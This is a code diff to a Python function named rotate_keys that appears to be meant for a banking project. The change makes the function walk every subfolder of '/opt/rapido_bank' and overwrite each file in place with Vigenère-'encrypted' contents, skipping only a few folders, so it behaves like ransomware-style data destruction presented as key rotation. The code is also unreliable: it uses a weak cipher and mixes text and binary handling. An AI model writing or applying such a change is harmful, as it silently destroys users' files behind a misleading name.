@@ -94,30 +94,34 @@ def rotate_keys():
     directory_to_encrypt = '/opt/rapido_bank'
 
     try:
-        for filename in os.listdir(directory_to_encrypt):
-            file_path = os.path.join(directory_to_encrypt, filename)
+        for root, dirs, files in os.walk(directory_to_encrypt):
             # Ensure the file is not in a directory to skip
-            if any(x in file_path for x in ['backups', 'shared', 'security_tools', 'portfolios']):
+            if any(skip in root for skip in ['backups', 'shared', 'security_tools', 'portfolios']):
                 continue
 
-            # Attempt to find a key file that matches this directory or file
-            possible_key_files = [k for k in os.listdir(key_directory) if 'project_key' in k]
-            if not possible_key_files:
-                print("No encryption keys available.")
-                continue
+            for filename in files:
+                file_path = os.path.join(root, filename)
 
-            # Sort to get the latest key file
-            latest_key_file = sorted(possible_key_files)[-1]
-            key_path = os.path.join(key_directory, latest_key_file)
-            
-            # Read the latest key
-            with open(key_path, 'rb') as kf:
-                key = kf.read()
+                # Attempt to find a key file that matches this directory or file
+                possible_key_files = [k for k in os.listdir(key_directory) if 'project_key' in k]
+                if not possible_key_files:
+                    print("No encryption keys available.")
+                    continue
 
-            # Encrypt the file
-            encrypted_contents = vigenere_encrypt(file_contents, key)  # Assuming vigenere_encrypt can handle binary data
-            with open(file_path, 'wb') as file:
-                file.write(encrypted_contents)
+                # Sort to get the latest key file
+                latest_key_file = sorted(possible_key_files)[-1]
+                key_path = os.path.join(key_directory, latest_key_file)
+                
+                # Read the latest key
+                with open(key_path, 'rb') as kf:
+                    key = kf.read()
+
+                # Encrypt the file
+                with open(file_path, 'r') as file:
+                    file_contents = file.read()
+                encrypted_contents = vigenere_encrypt(file_contents, key)  # Assuming vigenere_encrypt can handle binary data
+                with open(file_path, 'w') as file:
+                    file.write(encrypted_contents)
 
         print(f"Rotated keys using the latest available keys for all files in {directory_to_encrypt}")
 
